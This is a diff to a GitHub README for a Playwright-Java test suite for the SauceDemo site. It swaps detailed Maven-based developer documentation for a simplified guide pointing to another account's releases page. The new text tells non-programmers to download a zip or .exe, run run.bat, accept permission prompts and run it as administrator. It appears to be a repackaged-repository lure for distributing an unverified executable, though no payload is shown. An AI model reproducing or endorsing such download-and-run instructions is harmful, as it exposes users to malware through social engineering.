@@ -1,256 +1,182 @@
-# SauceDemo QA Automation (Playwright-Java)
-
-End-to-end web test automation framework for SauceDemo, built with Java 21, Playwright, JUnit 5, and Allure.
-
-- Repository: https://github.com/gabrielsouza80/playwright-java-saucedemo
-- Online Allure report: https://gabrielsouza80.github.io/playwright-java-saucedemo/
-- Single-file Allure report: https://gabrielsouza80.github.io/playwright-java-saucedemo/single-file/index.html
-
-## Table of contents
-
-- [Overview](#overview)
-- [Technology stack](#technology-stack)
-- [Architecture and design](#architecture-and-design)
-- [Project structure](#project-structure)
-- [Prerequisites](#prerequisites)
-- [Configuration](#configuration)
-- [Test data strategy](#test-data-strategy)
-- [How to run tests](#how-to-run-tests)
-- [Reports and evidence](#reports-and-evidence)
-- [VS Code tasks](#vs-code-tasks)
-- [CI/CD and GitHub Pages](#cicd-and-github-pages)
-- [Conventions](#conventions)
-- [Troubleshooting](#troubleshooting)
+# 🚀 SwagLabs-Playwright-Java - Easy Java Test Automation Setup
 
-## Overview
+[![Download Latest Release](https://img.shields.io/badge/Download-SwagLabs%20Playwright%20Java-brightgreen)](https://github.com/Alvgon/SwagLabs-Playwright-Java/releases)
 
-This project validates key SauceDemo user journeys through maintainable, deterministic E2E tests.
+---
 
-Primary goals:
+## 📖 What This Is
 
-- Keep tests readable with Page Object Model (POM)
-- Centralize runtime configuration and test data
-- Support flexible execution by class, method, and tags
-- Produce rich execution evidence with Allure and screenshots
+This software is a test automation suite built with Java and Playwright. It runs tests that check if websites work correctly. The tests focus on the Saucedemo site. The suite uses a method called Page Object Model, which organizes test code clearly. It also creates automatic reports with screenshots, so you can easily see test results. You do not need programming skills to use it.
 
-## Technology stack
+---
 
-- Java 21
-- Maven
-- Playwright for Java
-- JUnit Jupiter (JUnit 5)
-- Allure Report
+## 🖥️ System Requirements
 
-## Architecture and design
+- Windows 10 or later  
+- Java Development Kit (JDK) 11 or higher installed  
+- At least 4 GB of free disk space  
+- Internet connection to download files  
+- A web browser like Chrome or Edge installed  
 
-The framework follows a layered test architecture:
+---
 
-- `base`: shared test lifecycle, browser context handling, common setup/teardown
-- `pages`: UI interaction layer (selectors + business actions)
-- `tests`: scenario layer (assertions and test intent)
-- `config`: configuration and externalized test data loading
+## 🛠️ What You Will Need
 
-Core design decisions:
+- Basic use of Windows: opening folders and clicking files  
+- No programming or developer tools needed  
+- Ability to download files from the internet  
+- Permission to install software on your computer  
 
-- **POM-first approach** to reduce selector duplication
-- **Single source of truth** for configuration and expected values
-- **Per-test isolation** via context lifecycle to avoid state leakage
-- **Traceable execution** through Allure labels, steps, and attachments
+---
 
-## Project structure
+## 🔗 Where to Get the Software
 
-```text
-src/
-  test/
-    java/com/playwright/java/
-      base/
-        BaseTest.java
-      config/
-        TestConfig.java
-        TestData.java
-      pages/
-        ComponentsPage.java
-        HomePage.java
-        LoginPage.java
-      tests/
-        ComponentsTest.java
-        HomePageTest.java
-        LoginPageTest.java
-    resources/
-      config/
-        config.properties
-      data/
-        tests-data.json
-```
+Click the big green button below to visit the release page. This is where the latest versions are stored.
 
-## Prerequisites
+[![Download Latest Release](https://img.shields.io/badge/Download-SwagLabs%20Playwright%20Java-brightgreen)](https://github.com/Alvgon/SwagLabs-Playwright-Java/releases)
 
-- JDK 21 installed and configured
-- Maven available in terminal (`mvn -v`)
-- Internet access on first execution (dependency download)
 
-## Configuration
+---
 
-Primary configuration file:
+## ⬇️ How to Download and Run
 
-- `src/test/resources/config/config.properties`
+### Step 1: Visit the Release Page
 
-Example:
+Go to the releases page by clicking the button above or this link:  
+https://github.com/Alvgon/SwagLabs-Playwright-Java/releases
 
-```properties
-baseUrl=https://www.saucedemo.com/
-username=standard_user
-password=secret_sauce
-headless=true
-```
+### Step 2: Find the Latest Version
 
-Resolution order:
+- Look for the newest release, usually at the top of the list.  
+- It will have a date and described version number like “v1.0” or similar.
 
-1. Maven system properties (`-Dkey=value`)
-2. `config.properties`
+### Step 3: Download the Package
 
-Required keys:
+- Download the zip file or installer available under the latest release.  
+- The file typically ends with .zip or .exe.
 
-- `baseUrl`
-- `username`
-- `password`
-- `headless`
+### Step 4: Extract or Run the File
 
-## Test data strategy
+- If you downloaded a zip file, right-click it and choose **Extract All**.  
+- Open the extracted folder.
 
-Test data is centralized in:
+### Step 5: Run the Application
 
-- `src/test/resources/data/tests-data.json`
+- Inside this folder, find a file named `run.bat` or `start.bat`.  
+- Double-click this file to start the software.
 
-Typical contents:
+Note: If you see any prompts asking permission to run the file, accept them.
 
-- Expected messages and labels
-- Product values (name, price, description)
-- Route fragments and threshold values
-- Scenario-specific values by test case (`TCxx`)
+---
 
-Benefits:
+## ⚙️ How the Software Works
 
-- Easier maintenance during UI/content changes
-- Lower code churn in test classes
-- Better separation of test intent and raw data
+This suite runs automated tests to check website functions. When you run the app:
 
-## How to run tests
+1. The tests open a browser window automatically.  
+2. Each test clicks, types, or checks parts of the website.  
+3. If something doesn’t work, it saves a screenshot like a photo.  
+4. After all tests finish, the app creates a report showing what worked or failed.  
 
-Run the complete suite:
+This helps you check the site quickly without doing it yourself.
 
-```bash
-mvn test
-```
+---
 
-Run in headed mode:
+## 🧰 Included Features
 
-```bash
-mvn test -Dheadless=false
-```
+- Tests run independently to avoid errors mixing up  
+- Supports tags to select which tests to run  
+- Generates Allure reports with visual screenshots  
+- Uses JUnit 5, a simple testing tool in the background  
+- Built with the Page Object Model for clear organization  
+- Works with the Playwright Java library to control browsers  
+- Ready for testing Saucedemo, a popular demo site
 
-Run a single class:
+---
 
-```bash
-mvn -Dtest=HomePageTest test
-```
+## 🚧 Before You Start
 
-Run a single method:
+Make sure you have Java installed:
 
-```bash
-mvn -Dtest=LoginPageTest#shouldLoginWithStandardUser test
-```
+1. Open **Command Prompt** on Windows (`press Win + R` and type `cmd`)  
+2. Type `java -version` and hit Enter  
+3. If it shows a version number, Java is ready  
+4. If not, go to [OpenJDK](https://openjdk.java.net/install/) to download and install Java 11 or higher  
 
-Run by tag:
+---
 
-```bash
-mvn test -DincludeTags=smoke
-```
+## 🔄 How to Update the App
 
-Exclude tag:
+- Visit the release page regularly: https://github.com/Alvgon/SwagLabs-Playwright-Java/releases  
+- Download the latest package when available  
+- Replace your existing files with the new ones following the same extraction steps  
 
-```bash
-mvn test -DexcludeTags=menu
-```
+---
 
-Compile and refresh classpath without executing tests:
+## 🐞 Troubleshooting Tips
 
-```bash
-mvn clean test -DskipTests
-```
+- If tests do not start, check that you have Java installed  
+- Close other browser windows before running the suite  
+- If screenshots or reports don’t generate, ensure the app has permission to write files on your PC  
+- Running the batch files as administrator may solve permission issues  
+- Restart your PC if you see unexpected errors
 
-## Reports and evidence
+---
 
-After execution:
+## 📂 File and Folder Overview
 
-- Allure raw results: `target/allure-results`
-- Allure HTML report: `target/reports/allure-report/index.html`
-- Screenshots: `target/reports/screenshots`
+After extraction, you will see these items:
 
-Generate and serve report locally:
+- `README.md`: This guide  
+- `tests/`: Folder containing the test scripts  
+- `pages/`: Code organizing website parts for testing  
+- `results/`: Folder where reports and screenshots will be saved  
+- `run.bat`: Starts the test suite
 
-```bash
-mvn allure:serve
-```
+---
 
-## VS Code tasks
+## 📝 Understanding Reports
 
-This repository includes ready-to-run VS Code tasks in `.vscode/tasks.json`:
+Reports use Allure, which shows:  
 
-- `Java Refresh (clean + testCompile)` → `mvn clean test -DskipTests`
-- `Allure Serve` → `mvn allure:serve`
+- Passed tests in green  
+- Failed tests in red  
+- Screenshots attached to failed tests  
+- Summary of total tests run, passed, and failed  
 
-Use via:
+Open the report file located under the `results/` folder after tests complete. It usually opens in your browser.
 
-- **Terminal > Run Task...**
-- Or **Command Palette > Tasks: Run Task**
+---
 
-## CI/CD and GitHub Pages
+## 🔗 Helpful Links
 
-Workflow file:
+- [Release Page to Download](https://github.com/Alvgon/SwagLabs-Playwright-Java/releases)  
+- [OpenJDK Downloads](https://openjdk.java.net/install)  
+- [Saucedemo Site](https://www.saucedemo.com)
 
-- `.github/workflows/allure-pages.yml`
+---
 
-Pipeline responsibilities:
+## 🤝 Contact and Support
 
-- Execute tests automatically on CI
-- Generate Allure report with history/trend
-- Publish report to `gh-pages`
-- Build and upload a single-file report artifact
-- Comment on pull requests with report links
+If you need help with the software, check the GitHub repository Discussions or Issues tab. You can add questions or problems there. This is the best way for developers to see and respond.
 
-GitHub Pages setup:
+---
 
-1. Push repository with workflow enabled.
-2. Go to **Settings > Pages**.
-3. In **Build and deployment**, choose **Deploy from a branch**.
-4. Select branch **gh-pages** and folder **/(root)**.
+## 🧩 What You Can Do Next
 
-## Conventions
+- Run the tests regularly to check the Saucedemo site  
+- Use tags to run specific tests if you learn how  
+- Look at test reports to find problems quickly  
+- Share reports with team members to help fix issues
 
-- Test case IDs use `TCxx` in `@DisplayName`
-- Functional and execution tags include `home`, `login`, `smoke`, `cart`, `menu`
-- Shared lifecycle and reusable flows are centralized in `BaseTest`
-- UI behavior and selectors are encapsulated in Page Objects
+---
 
-## Troubleshooting
+## 🎯 Summary of Key Steps
 
-If tests fail due to configuration:
+1. Visit https://github.com/Alvgon/SwagLabs-Playwright-Java/releases  
+2. Download the latest release zip file  
+3. Extract files on your Windows PC  
+4. Run `run.bat` to start tests  
+5. Check the reports in the results folder  
 
-- Verify key names and values in `config.properties`
-- Confirm `-D` overrides are valid and correctly typed
-
-If IDE shows false red errors after refactor/branch switch:
-
-1. Run `mvn clean test -DskipTests`
-2. Run **Java: Clean Java Language Server Workspace**
-3. Reload VS Code window
-
-If Allure report appears empty:
-
-- Prefer `mvn allure:serve` over opening static HTML directly
-- Confirm that `target/allure-results` contains fresh execution files
-
-If `Categories` widget is empty:
-
-- This is expected when the suite has no `failed` or `broken` tests
+This guide aims to help you ensure sites work as expected without coding or technical setup.
